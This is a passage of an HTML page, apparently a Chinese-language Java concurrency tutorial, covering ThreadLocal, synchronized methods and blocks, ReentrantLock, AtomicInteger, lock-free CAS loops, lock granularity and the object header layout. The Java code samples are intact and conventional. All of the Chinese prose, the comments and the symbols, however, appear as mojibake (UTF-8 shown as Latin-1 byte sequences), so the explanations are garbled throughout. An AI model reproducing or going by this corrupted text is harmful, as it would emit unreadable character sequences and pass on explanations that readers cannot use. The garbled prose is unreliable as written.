<li>å¦‚æœå­—æ®µæ˜¯å¼•ç”¨ç±»å‹ï¼Œç¡®ä¿å¼•ç”¨çš„å¯¹è±¡ä¹Ÿæ˜¯ä¸å¯å˜çš„</li>
</ol>
<p><strong>Javaä¸­çš„ä¸å¯å˜ç±»ï¼š</strong></p>
<ul>
<li><code>String</code></li>
<li><code>Integer</code>ã€<code>Long</code>ç­‰åŒ…è£…ç±»</li>
<li><code>BigInteger</code>ã€<code>BigDecimal</code></li>
</ul>
<h4 data-id="heading-47">çº¿ç¨‹å°é—­</h4>
<p>**çº¿ç¨‹å°é—­ï¼ˆThread Confinementï¼‰**æ˜¯æŒ‡å°†å¯¹è±¡é™åˆ¶åœ¨å•ä¸ªçº¿ç¨‹ä¸­ï¼Œé¿å…å…±äº«ã€‚</p>
<p><strong>æ–¹å¼1ï¼šæ ˆå°é—­</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">localVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œçº¿ç¨‹å®‰å…¨</span>
    localVar++;
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šThreadLocal</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ThreadLocal&lt;Integer&gt; threadLocal = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        threadLocal.set(threadLocal.get() + <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> threadLocal.get();
    }
}
</code></pre>
<h4 data-id="heading-48">åŒæ­¥æœºåˆ¶</h4>
<p><strong>æ–¹å¼1ï¼šsynchronized</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
}
</code></pre>
<p><strong>æ–¹å¼2ï¼šLock</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            count++;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<p><strong>æ–¹å¼3ï¼šåŸå­ç±»</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count.incrementAndGet();
    }
}
</code></pre>
<h4 data-id="heading-49">æ— é”ç¼–ç¨‹</h4>
<p>**æ— é”ç¼–ç¨‹ï¼ˆLock-Free Programmingï¼‰**ä½¿ç”¨CASæ“ä½œå®ç°çº¿ç¨‹å®‰å…¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> current;
        <span class="hljs-type">int</span> next;
        <span class="hljs-keyword">do</span> {
            current = count.get();
            next = current + <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">while</span> (!count.compareAndSet(current, next));
    }
}
</code></pre>
<p><strong>æ— é”ç¼–ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…é”ç«äº‰</li>
<li>é¿å…æ­»é”</li>
<li>æ€§èƒ½æ›´å¥½ï¼ˆåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼‰</li>
</ul>
<p><strong>æ— é”ç¼–ç¨‹çš„æŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>ABAé—®é¢˜</li>
<li>è‡ªæ—‹å¼€é”€</li>
<li>å®ç°å¤æ‚</li>
</ul>
<h2 data-id="heading-50">ç¬¬ä¸‰ç«  synchronizedå…³é”®å­—</h2>
<h3 data-id="heading-51">3.1 synchronizedåŸºç¡€</h3>
<h4 data-id="heading-52">synchronizedçš„ä¸‰ç§ç”¨æ³•</h4>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯Javaä¸­æœ€åŸºæœ¬çš„åŒæ­¥æœºåˆ¶</li>
<li>å¯ä»¥é”ä½ä»£ç å—ï¼Œä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æ‰§è¡Œ</li>
<li>å°±åƒç»™ä»£ç æ®µåŠ ä¸Š"é—¨é”"ï¼Œä¸€æ¬¡åªå…è®¸ä¸€ä¸ªäººè¿›å…¥</li>
</ul>
<h5 data-id="heading-53">1. ä¿®é¥°å®ä¾‹æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨æ–¹æ³•å£°æ˜å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯å½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šå½“å‰å®ä¾‹å¯¹è±¡ï¼ˆthisï¼‰</li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªæ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… åŒä¸€ä¸ªå®ä¾‹çš„å¤šä¸ªçº¿ç¨‹ä¼šäº’æ–¥</li>
<li>âŒ ä¸åŒå®ä¾‹ä¹‹é—´ä¸äº’æ–¥ï¼ˆå„è‡ªç‹¬ç«‹ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆåŒä¸€ä¸ªå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();

<span class="hljs-comment">// çº¿ç¨‹3ä¸ä¼šä¸çº¿ç¨‹1ã€2äº’æ–¥ï¼ˆä¸åŒå®ä¾‹ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
</code></pre>
<h5 data-id="heading-54">2. ä¿®é¥°é™æ€æ–¹æ³•</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨é™æ€æ–¹æ³•å‰åŠ ä¸Š<code>synchronized</code>å…³é”®å­—</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”çš„æ˜¯ç±»å¯¹è±¡ï¼ˆCounter.classï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;
    }
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {  <span class="hljs-comment">// ç­‰ä»·å†™æ³•</span>
            count++;
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>é”å¯¹è±¡</strong>ï¼šç±»å¯¹è±¡ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œå¦‚<code>Counter.class</code></li>
<li><strong>ä½œç”¨èŒƒå›´</strong>ï¼šæ•´ä¸ªé™æ€æ–¹æ³•</li>
<li><strong>äº’æ–¥å…³ç³»</strong>ï¼š
<ul>
<li>âœ… æ‰€æœ‰å®ä¾‹å…±äº«åŒä¸€æŠŠé”ï¼ˆå› ä¸ºClasså¯¹è±¡åªæœ‰ä¸€ä¸ªï¼‰</li>
<li>âœ… ä¸åŒå®ä¾‹çš„çº¿ç¨‹ä¹Ÿä¼šäº’æ–¥</li>
<li>âŒ é™æ€æ–¹æ³•å’Œå®ä¾‹æ–¹æ³•çš„é”ä¸åŒï¼Œä¸ä¼šäº’æ–¥</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹ç†è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Counter</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-type">Counter</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();

<span class="hljs-comment">// çº¿ç¨‹1å’Œçº¿ç¨‹2ä¼šäº’æ–¥ï¼ˆé™æ€æ–¹æ³•ï¼Œå…±äº«ç±»é”ï¼‰</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; Counter.increment()).start();

<span class="hljs-comment">// å³ä½¿ä¸åŒå®ä¾‹ï¼Œä¹Ÿä¼šäº’æ–¥</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c1.increment()).start();
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; c2.increment()).start();
<span class="hljs-comment">// è¿™ä¸¤ä¸ªçº¿ç¨‹ä¼šäº’æ–¥ï¼Œå› ä¸ºå®ƒä»¬éƒ½ä½¿ç”¨Counter.classä½œä¸ºé”</span>
</code></pre>
<h5 data-id="heading-55">3. ä¿®é¥°ä»£ç å—</h5>
<p><strong>ç”¨æ³•ï¼š</strong> åœ¨ä»£ç å—å‰åŠ ä¸Š<code>synchronized(å¯¹è±¡)</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// ä¸“ç”¨é”å¯¹è±¡</span>
    
    <span class="hljs-comment">// ä½¿ç”¨æŒ‡å®šçš„é”å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(lock) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨thisä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedæ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
            count++;
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨ç±»å¯¹è±¡ä½œä¸ºé”ï¼ˆç­‰ä»·äºsynchronizedé™æ€æ–¹æ³•ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment3</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span>(Counter.class) {
            <span class="hljs-comment">// é™æ€ä»£ç å—</span>
        }
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹è¯´æ˜ï¼š</strong></p>
<ul>
<li><strong>çµæ´»æ€§é«˜</strong>ï¼šå¯ä»¥æŒ‡å®šä»»æ„å¯¹è±¡ä½œä¸ºé”</li>
<li><strong>ç²’åº¦æ›´ç»†</strong>ï¼šåªé”ä½å¿…è¦çš„ä»£ç ï¼Œä¸é”æ•´ä¸ªæ–¹æ³•</li>
<li><strong>æ€§èƒ½æ›´å¥½</strong>ï¼šå‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆæ¨èä½¿ç”¨ä»£ç å—ï¼Ÿ</strong></p>
<ul>
<li>å¯ä»¥åªé”ä½å¿…è¦çš„ä»£ç ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ–¹æ³•</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>æ›´çµæ´»ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡</li>
</ul>
<h4 data-id="heading-56">é”çš„å¯¹è±¡ï¼ˆé‡è¦æ¦‚å¿µï¼‰</h4>
<p><strong>æ ¸å¿ƒåŸåˆ™ï¼šåªæœ‰ä½¿ç”¨åŒä¸€ä¸ªå¯¹è±¡ä½œä¸ºé”ï¼Œæ‰ä¼šäº’æ–¥</strong></p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>synchronizedé”çš„æ˜¯<strong>å¯¹è±¡</strong>ï¼Œä¸æ˜¯ä»£ç </li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>åŒä¸€ä¸ªå¯¹è±¡</strong>ä½œä¸ºé” â†’ äº’æ–¥</li>
<li>å¤šä¸ªçº¿ç¨‹ä½¿ç”¨<strong>ä¸åŒå¯¹è±¡</strong>ä½œä¸ºé” â†’ ä¸äº’æ–¥</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”1</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// é”2</span>

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ1</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock2ä½œä¸ºé”ï¼ˆä¸method1ä¸äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {
        <span class="hljs-comment">// æ“ä½œ2</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨lock1ä½œä¸ºé”ï¼ˆä¸method1äº’æ–¥ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method3</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {
        <span class="hljs-comment">// æ“ä½œ3ï¼Œä¸method1äº’æ–¥</span>
    }
}
</code></pre>
<p><strong>äº’æ–¥å…³ç³»æ€»ç»“ï¼š</strong></p>

































<table><thead><tr><th>æ–¹æ³•</th><th>ä½¿ç”¨çš„é”</th><th>method1</th><th>method2</th><th>method3</th></tr></thead><tbody><tr><td>method1</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr><tr><td>method2</td><td>lock2</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td></tr><tr><td>method3</td><td>lock1</td><td>âœ… äº’æ–¥</td><td>âŒ ä¸äº’æ–¥</td><td>âœ… äº’æ–¥</td></tr></tbody></table>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ é”å¯¹è±¡ä¸èƒ½æ˜¯nullï¼Œå¦åˆ™ä¼šæŠ›å‡º<code>NullPointerException</code></li>
<li>âœ… æ¨èä½¿ç”¨<code>final</code>ä¿®é¥°é”å¯¹è±¡ï¼Œé˜²æ­¢è¢«é‡æ–°èµ‹å€¼</li>
<li>âœ… ä½¿ç”¨ä¸“é—¨çš„é”å¯¹è±¡ï¼ˆå¦‚<code>private final Object lock</code>ï¼‰ï¼Œè€Œä¸æ˜¯thisæˆ–ä¸šåŠ¡å¯¹è±¡</li>
</ul>
<h4 data-id="heading-57">é”çš„ç²’åº¦</h4>
<p><strong>ä»€ä¹ˆæ˜¯é”çš„ç²’åº¦ï¼Ÿ</strong></p>
<ul>
<li><strong>ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§å°</li>
<li><strong>ç²—ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å¤§ï¼ˆå¦‚æ•´ä¸ªæ–¹æ³•ï¼‰</li>
<li><strong>ç»†ç²’åº¦</strong>ï¼šé”ä½çš„èŒƒå›´å°ï¼ˆå¦‚å‡ è¡Œä»£ç ï¼‰</li>
</ul>
<p><strong>åŸåˆ™ï¼šå°½é‡ä½¿ç”¨ç»†ç²’åº¦é”ï¼Œæé«˜å¹¶å‘æ€§èƒ½</strong></p>
<h5 data-id="heading-58">ç²—ç²’åº¦é”ï¼ˆä¸æ¨èï¼‰</h5>
<p><strong>é—®é¢˜ï¼š</strong> é”ä½äº†ä¸éœ€è¦é”çš„ä»£ç ï¼Œå¯¼è‡´ä¸å¿…è¦çš„äº’æ–¥</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ ç²—ç²’åº¦é”ï¼šé”ä½æ•´ä¸ªæ–¹æ³•</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    count1++;
    <span class="hljs-comment">// å…¶ä»–ä¸ç›¸å…³çš„æ“ä½œ...</span>
    <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•éƒ½è¢«é”ä½ï¼Œå½±å“æ€§èƒ½</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    count2++;  
    <span class="hljs-comment">// ä¸increment1äº’æ–¥ï¼Œä½†å®é™…ä¸Šæ²¡å¿…è¦</span>
    <span class="hljs-comment">// å› ä¸ºcount1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡</span>
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>count1å’Œcount2æ˜¯ä¸åŒçš„å˜é‡ï¼Œäº’ä¸å¹²æ‰°</li>
<li>ä½†ä½¿ç”¨synchronizedæ–¹æ³•ï¼Œå¯¼è‡´å®ƒä»¬äº’æ–¥</li>
<li>é™ä½äº†å¹¶å‘æ€§èƒ½</li>
</ul>
<h5 data-id="heading-59">ç»†ç²’åº¦é”ï¼ˆæ¨èï¼‰</h5>
<p><strong>ä¼˜ç‚¹ï¼š</strong> åªé”ä½å¿…è¦çš„ä»£ç ï¼Œæé«˜å¹¶å‘æ€§</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… ç»†ç²’åº¦é”ï¼šåªé”ä½å¿…è¦çš„ä»£ç </span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count1çš„é”</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// count2çš„é”</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock1) {  <span class="hljs-comment">// åªé”count1ç›¸å…³çš„æ“ä½œ</span>
        count1++;
    }
    <span class="hljs-comment">// å…¶ä»–æ“ä½œä¸å—é”å½±å“ï¼Œå¯ä»¥å¹¶å‘æ‰§è¡Œ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock2) {  <span class="hljs-comment">// åªé”count2ç›¸å…³çš„æ“ä½œ</span>
        count2++;
    }
    <span class="hljs-comment">// ä¸increment1ä¸äº’æ–¥ï¼Œå¯ä»¥åŒæ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><strong>ç²—ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œéœ€è¦ä¸²è¡Œæ‰§è¡Œ</li>
<li><strong>ç»†ç²’åº¦é”</strong>ï¼šä¸¤ä¸ªçº¿ç¨‹æ“ä½œcount1å’Œcount2æ—¶ï¼Œå¯ä»¥å¹¶è¡Œæ‰§è¡Œ</li>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šç»†ç²’åº¦é”æ˜æ˜¾æ›´å¥½</li>
</ul>
<p><strong>æœ€ä½³å®è·µï¼š</strong></p>
<ul>
<li>âœ… ä½¿ç”¨ä¸åŒçš„é”å¯¹è±¡ä¿æŠ¤ä¸åŒçš„èµ„æº</li>
<li>âœ… åªé”ä½å¿…è¦çš„ä»£ç æ®µ</li>
<li>âœ… å°½é‡å‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
</ul>
<h3 data-id="heading-60">3.2 synchronizedåŸç†</h3>
<h4 data-id="heading-61">å¯¹è±¡å¤´ç»“æ„</h4>
<p><strong>Javaå¯¹è±¡åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</strong></p>
<p>æ¯ä¸ªJavaå¯¹è±¡åœ¨å†…å­˜ä¸­éƒ½æœ‰å¯¹è±¡å¤´ï¼Œå¯¹è±¡å¤´ä¸­åŒ…å«äº†é”çš„ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-css" lang="css">Javaå¯¹è±¡å†…å­˜å¸ƒå±€ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´ï¼ˆ<span class="hljs-selector-tag">Object</span> <span class="hljs-selector-tag">Header</span>ï¼‰              â”‚
â”‚  â”œâ”€â”€ <span class="hljs-selector-tag">Mark</span> Wordï¼ˆ<span class="hljs-number">8</span>å­—èŠ‚ï¼‰              â”‚ â† é”ä¿¡æ¯å­˜å‚¨åœ¨è¿™é‡Œ
â”‚  â”œâ”€â”€ Class Pointerï¼ˆ<span class="hljs-number">4</span>/<span class="hljs-number">8</span>å­—èŠ‚ï¼‰        â”‚ â† æŒ‡å‘ç±»ä¿¡æ¯
â”‚  â””â”€â”€ Array Lengthï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼Œä»…æ•°ç»„ï¼‰    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰           â”‚ â† å¯¹è±¡çš„å­—æ®µå€¼
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……ï¼ˆ<span class="hljs-attribute">Padding</span>ï¼‰                 â”‚ â† å†…å­˜å¯¹é½
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>Mark Word</strong>ï¼šæœ€é‡è¦çš„éƒ¨åˆ†ï¼Œå­˜å‚¨é”çš„çŠ¶æ€ä¿¡æ¯</li>
<li><strong>Class Pointer</strong>ï¼šæŒ‡å‘ç±»çš„å…ƒæ•°æ®ä¿¡æ¯</li>
<li>JVMé€šè¿‡ä¿®æ”¹Mark Wordæ¥å®ç°é”æœºåˆ¶</li>
</ul>
<h4 data-id="heading-62">Mark Wordè¯¦è§£</h4>
<p><strong>Mark Wordæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
